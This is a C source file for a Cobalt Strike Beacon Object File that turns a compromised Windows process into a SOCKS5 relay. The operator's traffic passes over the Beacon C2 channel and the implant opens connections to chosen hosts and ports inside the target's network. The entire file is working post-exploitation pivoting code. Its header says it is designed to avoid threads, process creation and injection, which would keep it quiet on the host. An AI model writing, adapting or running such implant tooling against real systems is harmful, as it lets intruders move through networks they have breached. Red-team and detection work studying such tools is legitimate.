/*
 * socks5 - Beacon Object File task pump for a client-side SOCKS5 proxy.
 *
 * A SOCKS5 listener cannot live inside a normal BOF: the BOF runs
 * synchronously on Beacon's task thread and its image is unloaded when it
 * returns.  This BOF therefore exports small, stateless-looking operations
 * and keeps its state in the Beacon value store:
 *
 *   operator SOCKS5 client
 *        |
 *        v
 *   socks5_orchestrator.py (Cobalt Strike client side)
 *        |  HTTPS REST API
 *        v
 *   csrestapi / team server  --- Beacon C2 ---> target Beacon
 *                                                   |
 *                                                   +--> target:port
 *
 * Every SOCKS5 read/write/connect becomes one BOF task.  The sockets are
 * created by the BOF inside the Beacon process and stay open between BOF
 * invocations.  The pointer to the state table is saved with
 * BeaconAddValue() and recovered with BeaconGetValue().  The state is
 * allocated on the process heap because the BOF image itself is freed.
 *
 * No CreateThread, CreateProcess, fork&run, or injection is used.  The
 * trade-off is latency: one task per chunk, bounded by the Beacon sleep
 * interval.  Keep chunks large and the Beacon sleep short when possible.
 *
 * Request frame (network byte order, 20-byte header):
 *
 *   u32 magic        0x53355231 ("S5R1")
 *   u32 op           CONNECT(1) READ(2) WRITE(3) CLOSE(4) PING(5) RESET(6)
 *   u32 stream_id
 *   u32 timeout_ms   0 = operation default
 *   u32 payload_len
 *   u8  payload[payload_len]
 *
 * CONNECT payload: u16 port_be | host bytes (no NUL)
 * READ    payload: u32 max_bytes (optional; 0 = 8192)
 * WRITE   payload: raw bytes
 * CLOSE/RESET/PING: no payload
 *
 * Result line written with BeaconOutput():
 *
 *   S5R <stream_id> <status> <error> <hex-data>\n
 *
 * status: 0=OK 1=AGAIN 2=EOF 3=ERROR 4=BAD_REQUEST
 * error : WSA error code, or 0
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include "beacon.h"
#include "bofdefs.h"

#define PUMP_KEY            "socks5.pump.v2"
#define PUMP_MAGIC          0x53355032u /* "S5P2" */

#define FRAME_MAGIC         0x53355231u /* "S5R1" */
#define FRAME_HEADER        20

#define OP_CONNECT          1
#define OP_READ             2
#define OP_WRITE            3
#define OP_CLOSE            4
#define OP_PING             5
#define OP_RESET            6

#define R_OK                0
#define R_AGAIN             1
#define R_EOF               2
#define R_ERR               3
#define R_BAD               4

#define MAX_STREAMS         16
#define MAX_CHUNK           8192
#define MAX_HOST            255

#define DEF_CONNECT_TIMEOUT 4000
#define DEF_READ_TIMEOUT    750
#define DEF_WRITE_TIMEOUT   4000
#define MAX_TIMEOUT         30000

typedef struct {
	int          in_use;
	SOCKET       s;
	unsigned int id;
} S5_STREAM;

typedef struct {
	unsigned int magic;
	int          wsa_started;
	S5_STREAM    streams[MAX_STREAMS];
} S5_STATE;

static unsigned int be32(const unsigned char *p)
{
	return ((unsigned int)p[0] << 24) | ((unsigned int)p[1] << 16) |
	       ((unsigned int)p[2] << 8) | (unsigned int)p[3];
}

static unsigned short be16(const unsigned char *p)
{
	return (unsigned short)(((unsigned short)p[0] << 8) |
	                        (unsigned short)p[1]);
}

static unsigned int clamp_timeout(unsigned int v, unsigned int def)
{
	if (v == 0)
		v = def;
	if (v > MAX_TIMEOUT)
		v = MAX_TIMEOUT;
	return v;
}

static void tv_from_ms(struct timeval *tv, unsigned int ms)
{
	tv->tv_sec = (long)(ms / 1000);
	tv->tv_usec = (long)((ms % 1000) * 1000);
}

static int append_uint(char *dst, unsigned int v)
{
	char tmp[10];
	int n = 0;
	int i;

	if (v == 0) {
		dst[0] = '0';
		return 1;
	}
	while (v > 0 && n < (int)sizeof(tmp)) {
		tmp[n++] = (char)('0' + (v % 10));
		v /= 10;
	}
	for (i = 0; i < n; i++)
		dst[i] = tmp[n - 1 - i];
	return n;
}

static void emit_result(unsigned int id, unsigned int status,
                        unsigned int err, const unsigned char *data, int len)
{
	static const char hexdigits[] = "0123456789abcdef";
	static char out[96 + (MAX_CHUNK * 2)];
	int off = 0;
	int i;

	if (len < 0)
		len = 0;
	if (len > MAX_CHUNK)
		len = MAX_CHUNK;

	out[off++] = 'S';
	out[off++] = '5';
	out[off++] = 'R';
	out[off++] = ' ';
	off += append_uint(out + off, id);
	out[off++] = ' ';
	off += append_uint(out + off, status);
	out[off++] = ' ';
	off += append_uint(out + off, err);
	out[off++] = ' ';

	for (i = 0; i < len; i++) {
		out[off++] = hexdigits[(data[i] >> 4) & 0x0f];
		out[off++] = hexdigits[data[i] & 0x0f];
	}
	out[off++] = '\n';

	BeaconOutput(CALLBACK_OUTPUT, out, off);
}

/* ---- persistent state ------------------------------------------------ */

static S5_STATE *state_get(void)
{
	S5_STATE *st;
	WSADATA wsa;
	int i;

	st = (S5_STATE *)BeaconGetValue(PUMP_KEY);
	if (st != NULL && st->magic == PUMP_MAGIC)
		return st;

	st = (S5_STATE *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0,
	                                    sizeof(S5_STATE));
	if (st == NULL)
		return NULL;

	MSVCRT$memset(st, 0, sizeof(S5_STATE));
	st->magic = PUMP_MAGIC;

	if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, st);
		return NULL;
	}
	st->wsa_started = 1;

	for (i = 0; i < MAX_STREAMS; i++) {
		st->streams[i].s = INVALID_SOCKET;
		st->streams[i].id = 0;
		st->streams[i].in_use = 0;
	}

	BeaconAddValue(PUMP_KEY, st);
	return st;
}

static void stream_close(S5_STREAM *s)
{
	if (s->s != INVALID_SOCKET)
		WS2_32$closesocket(s->s);
	s->s = INVALID_SOCKET;
	s->id = 0;
	s->in_use = 0;
}

static void state_free(S5_STATE *st)
{
	int i;

	for (i = 0; i < MAX_STREAMS; i++)
		stream_close(&st->streams[i]);

	if (st->wsa_started)
		WS2_32$WSACleanup();

	BeaconRemoveValue(PUMP_KEY);
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, st);
}

static S5_STREAM *stream_find(S5_STATE *st, unsigned int id)
{
	int i;

	for (i = 0; i < MAX_STREAMS; i++) {
		if (st->streams[i].in_use && st->streams[i].id == id)
			return &st->streams[i];
	}
	return NULL;
}

static S5_STREAM *stream_alloc(S5_STATE *st, unsigned int id)
{
	S5_STREAM *s;
	int i;

	s = stream_find(st, id);
	if (s != NULL)
		stream_close(s);

	for (i = 0; i < MAX_STREAMS; i++) {
		if (!st->streams[i].in_use) {
			s = &st->streams[i];
			s->in_use = 1;
			s->id = id;
			s->s = INVALID_SOCKET;
			return s;
		}
	}
	return NULL;
}

/* ---- operations ------------------------------------------------------ */

static int resolve_host(const char *host, unsigned long *addr)
{
	struct hostent *he;

	*addr = WS2_32$inet_addr(host);
	if (*addr != INADDR_NONE)
		return 1;

	he = WS2_32$gethostbyname(host);
	if (he == NULL || he->h_addrtype != AF_INET ||
	    he->h_addr_list[0] == NULL)
		return 0;

	MSVCRT$memcpy(addr, he->h_addr_list[0], 4);
	return 1;
}

static void op_connect(S5_STATE *st, unsigned int id, unsigned int timeout,
                       const unsigned char *payload, int len)
{
	char host[MAX_HOST + 1];
	char *hostp;
	struct sockaddr_in sa;
	unsigned long addr;
	unsigned int port;
	S5_STREAM *s;
	SOCKET sock;
	int hlen;
	int rc;
	int err;

	if (len < 3 || len > MAX_HOST + 2) {
		emit_result(id, R_BAD, 0, NULL, 0);
		return;
	}

	hlen = len - 2;
	MSVCRT$memcpy(host, payload + 2, (size_t)hlen);
	host[hlen] = 0;
	if (host[0] == 0) {
		emit_result(id, R_BAD, 1, NULL, 0);
		return;
	}
	hostp = host;
	port = be16(payload);

	if (!resolve_host(hostp, &addr)) {
		emit_result(id, R_ERR, WSAHOST_NOT_FOUND, NULL, 0);
		return;
	}

	MSVCRT$memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = addr;
	sa.sin_port = WS2_32$htons((u_short)port);

	sock = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		emit_result(id, R_ERR, (unsigned int)WS2_32$WSAGetLastError(),
		            NULL, 0);
		return;
	}

	{
		u_long one = 1;
		WS2_32$ioctlsocket(sock, FIONBIO, &one);
	}

	rc = WS2_32$connect(sock, (struct sockaddr *)&sa, (int)sizeof(sa));
	if (rc == 0) {
		s = stream_alloc(st, id);
		if (s == NULL) {
			WS2_32$closesocket(sock);
			emit_result(id, R_ERR, WSAENOBUFS, NULL, 0);
			return;
		}
		s->s = sock;
		emit_result(id, R_OK, 0, NULL, 0);
		return;
	}

	err = WS2_32$WSAGetLastError();
	if (err != WSAEWOULDBLOCK && err != WSAEINPROGRESS) {
		WS2_32$closesocket(sock);
		emit_result(id, R_ERR, (unsigned int)err, NULL, 0);
		return;
	}

	{
		fd_set wf;
		struct timeval tv;
		unsigned int wait_ms = clamp_timeout(timeout,
		                                     DEF_CONNECT_TIMEOUT);

		FD_ZERO(&wf);
		FD_SET(sock, &wf);
		tv_from_ms(&tv, wait_ms);

		rc = WS2_32$select(0, NULL, &wf, NULL, &tv);
		if (rc == 0) {
			WS2_32$closesocket(sock);
			emit_result(id, R_ERR, WSAETIMEDOUT, NULL, 0);
			return;
		}
		if (rc == SOCKET_ERROR) {
			err = WS2_32$WSAGetLastError();
			WS2_32$closesocket(sock);
			emit_result(id, R_ERR, (unsigned int)err, NULL, 0);
			return;
		}
	}

	{
		int soerr = 0;
		int elen = (int)sizeof(soerr);

		WS2_32$getsockopt(sock, SOL_SOCKET, SO_ERROR,
		                  (char *)&soerr, &elen);
		if (soerr != 0) {
			WS2_32$closesocket(sock);
			emit_result(id, R_ERR, (unsigned int)soerr, NULL, 0);
			return;
		}
	}

	s = stream_alloc(st, id);
	if (s == NULL) {
		WS2_32$closesocket(sock);
		emit_result(id, R_ERR, WSAENOBUFS, NULL, 0);
		return;
	}
	s->s = sock;
	emit_result(id, R_OK, 0, NULL, 0);
}

static void op_read(S5_STATE *st, unsigned int id, unsigned int timeout,
                    const unsigned char *payload, int len)
{
	static unsigned char buf[MAX_CHUNK];
	S5_STREAM *s;
	unsigned int max = MAX_CHUNK;
	unsigned int wait_ms;
	fd_set rf;
	struct timeval tv;
	int rc;
	int n;

	s = stream_find(st, id);
	if (s == NULL) {
		emit_result(id, R_ERR, WSAENOTCONN, NULL, 0);
		return;
	}

	if (len >= 4) {
		max = be32(payload);
		if (max == 0 || max > MAX_CHUNK)
			max = MAX_CHUNK;
	}

	wait_ms = clamp_timeout(timeout, DEF_READ_TIMEOUT);
	FD_ZERO(&rf);
	FD_SET(s->s, &rf);
	tv_from_ms(&tv, wait_ms);

	rc = WS2_32$select(0, &rf, NULL, NULL, &tv);
	if (rc == 0) {
		emit_result(id, R_AGAIN, 0, NULL, 0);
		return;
	}
	if (rc == SOCKET_ERROR) {
		emit_result(id, R_ERR, (unsigned int)WS2_32$WSAGetLastError(),
		            NULL, 0);
		return;
	}

	n = WS2_32$recv(s->s, (char *)buf, (int)max, 0);
	if (n > 0) {
		emit_result(id, R_OK, 0, buf, n);
	} else if (n == 0) {
		emit_result(id, R_EOF, 0, NULL, 0);
	} else {
		int err = WS2_32$WSAGetLastError();
		if (err == WSAEWOULDBLOCK)
			emit_result(id, R_AGAIN, 0, NULL, 0);
		else
			emit_result(id, R_ERR, (unsigned int)err, NULL, 0);
	}
}

static void op_write(S5_STATE *st, unsigned int id, unsigned int timeout,
                     const unsigned char *payload, int len)
{
	S5_STREAM *s;
	unsigned int wait_ms;
	DWORD started;
	int sent = 0;

	s = stream_find(st, id);
	if (s == NULL) {
		emit_result(id, R_ERR, WSAENOTCONN, NULL, 0);
		return;
	}
	if (len <= 0) {
		emit_result(id, R_OK, 0, NULL, 0);
		return;
	}

	wait_ms = clamp_timeout(timeout, DEF_WRITE_TIMEOUT);
	started = KERNEL32$GetTickCount();

	while (sent < len) {
		int rc = WS2_32$send(s->s, (const char *)payload + sent,
		                     len - sent, 0);

		if (rc > 0) {
			sent += rc;
			continue;
		}

		if (rc == SOCKET_ERROR &&
		    WS2_32$WSAGetLastError() == WSAEWOULDBLOCK) {
			DWORD elapsed = KERNEL32$GetTickCount() - started;
			fd_set wf;
			struct timeval tv;
			int sr;

			if (elapsed >= wait_ms) {
				emit_result(id, R_ERR, WSAETIMEDOUT, NULL, 0);
				return;
			}

			FD_ZERO(&wf);
			FD_SET(s->s, &wf);
			tv_from_ms(&tv, wait_ms - elapsed);
			sr = WS2_32$select(0, NULL, &wf, NULL, &tv);
			if (sr == 0) {
				emit_result(id, R_ERR, WSAETIMEDOUT, NULL, 0);
				return;
			}
			if (sr == SOCKET_ERROR) {
				emit_result(id, R_ERR,
				            (unsigned int)WS2_32$WSAGetLastError(),
				            NULL, 0);
				return;
			}
			continue;
		}

		{
			int err = (rc == SOCKET_ERROR)
			          ? WS2_32$WSAGetLastError()
			          : 0;
			emit_result(id, R_ERR, (unsigned int)err, NULL, 0);
		}
		return;
	}

	emit_result(id, R_OK, 0, NULL, 0);
}

/* ---- entry point ----------------------------------------------------- */

void go(char *args, int alen)
{
	datap parser;
	unsigned char *frame;
	int flen = 0;
	unsigned int op;
	unsigned int id;
	unsigned int timeout;
	unsigned int plen;
	const unsigned char *payload;
	S5_STATE *st;

	if (args == NULL || alen <= 0) {
		BeaconPrintf(CALLBACK_ERROR,
		             "[socks5] no arguments (expected packed binary frame)\n");
		return;
	}

	BeaconDataParse(&parser, args, alen);
	frame = (unsigned char *)BeaconDataExtract(&parser, &flen);
	if (frame == NULL || flen < FRAME_HEADER) {
		emit_result(0, R_BAD, 0, NULL, 0);
		return;
	}

	if (be32(frame) != FRAME_MAGIC) {
		emit_result(0, R_BAD, 1, NULL, 0);
		return;
	}

	op = be32(frame + 4);
	id = be32(frame + 8);
	timeout = be32(frame + 12);
	plen = be32(frame + 16);

	if (plen > (unsigned int)(flen - FRAME_HEADER)) {
		emit_result(id, R_BAD, 2, NULL, 0);
		return;
	}
	payload = frame + FRAME_HEADER;

	if (op == OP_RESET) {
		st = (S5_STATE *)BeaconGetValue(PUMP_KEY);
		if (st != NULL && st->magic == PUMP_MAGIC)
			state_free(st);
		emit_result(id, R_OK, 0, NULL, 0);
		return;
	}

	st = state_get();
	if (st == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "[socks5] state allocation failed\n");
		emit_result(id, R_ERR, 0, NULL, 0);
		return;
	}

	switch (op) {
	case OP_CONNECT:
		op_connect(st, id, timeout, payload, (int)plen);
		break;
	case OP_READ:
		op_read(st, id, timeout, payload, (int)plen);
		break;
	case OP_WRITE:
		op_write(st, id, timeout, payload, (int)plen);
		break;
	case OP_CLOSE: {
		S5_STREAM *s = stream_find(st, id);
		if (s != NULL)
			stream_close(s);
		emit_result(id, R_OK, 0, NULL, 0);
		break;
	}
	case OP_PING:
		emit_result(id, R_OK, 0, NULL, 0);
		break;
	default:
		emit_result(id, R_BAD, 3, NULL, 0);
		break;
	}
}
